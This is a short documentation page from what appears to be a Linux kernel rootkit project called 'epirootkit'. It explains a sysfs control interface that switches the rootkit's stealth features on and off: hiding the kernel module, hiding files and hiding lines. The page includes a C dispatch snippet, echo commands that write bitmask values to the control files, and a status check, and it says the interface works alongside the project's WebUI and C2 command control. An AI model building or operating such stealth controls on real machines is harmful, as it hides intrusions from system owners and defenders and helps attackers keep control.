---
title: "Sysfs Interface"
description: "Linux-native configuration using octal permission system"
icon: "settings"
date: "2025-05-30T00:00:00+01:00"
lastmod: "2025-05-30T00:00:00+01:00"
draft: false
toc: true
weight: 520
---

# Sysfs Interface

Linux sysfs interface with octal permission-style configuration for rootkit control.

## Implementation

Directory: `/sys/kernel/epirootkit/`

Uses an octal bitmask system where each bit controls specific stealth features:
- Bit 0 (1): Module hiding
- Bit 1 (2): File hiding  
- Bit 2 (4): Line hiding

```c
static void update_hide_state(int mode)
{
    if (mode & 1) enable_module_hiding();
    if (mode & 2) enable_file_hiding();
    if (mode & 4) enable_line_hiding();
}
```

## Sysfs Files

**`/sys/kernel/epirootkit/hide`** - Controls stealth features
**`/sys/kernel/epirootkit/unhide`** - Quick disable all hiding

## Usage

```bash
# Enable all stealth features (7 = 4+2+1)
echo 7 > /sys/kernel/epirootkit/hide

# Enable only module and file hiding (3 = 2+1)
echo 3 > /sys/kernel/epirootkit/hide

# Disable all hiding
echo 1 > /sys/kernel/epirootkit/unhide

# Check status
cat /proc/epirootkit_status
```

## Control Integration

Works alongside WebUI and C2 commands for unified rootkit management. 